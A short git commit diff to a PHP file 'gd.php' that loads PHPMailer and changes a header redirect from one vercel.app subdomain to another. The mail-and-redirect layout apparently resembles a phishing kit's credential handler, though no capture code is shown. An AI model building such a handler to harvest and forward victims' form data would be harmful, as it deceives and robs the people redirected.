d85b2506f1ac9e9f9ccbdd25fdead1175d19304a
team11203 <155807397+team11203@users.noreply.github.com>
2025-07-23 10:10:05 +0500

    Update gd.php

--- gd.php
+++ gd.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://in-use-info.vercel.app/");
+header("Location:https://in-to-yoy.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
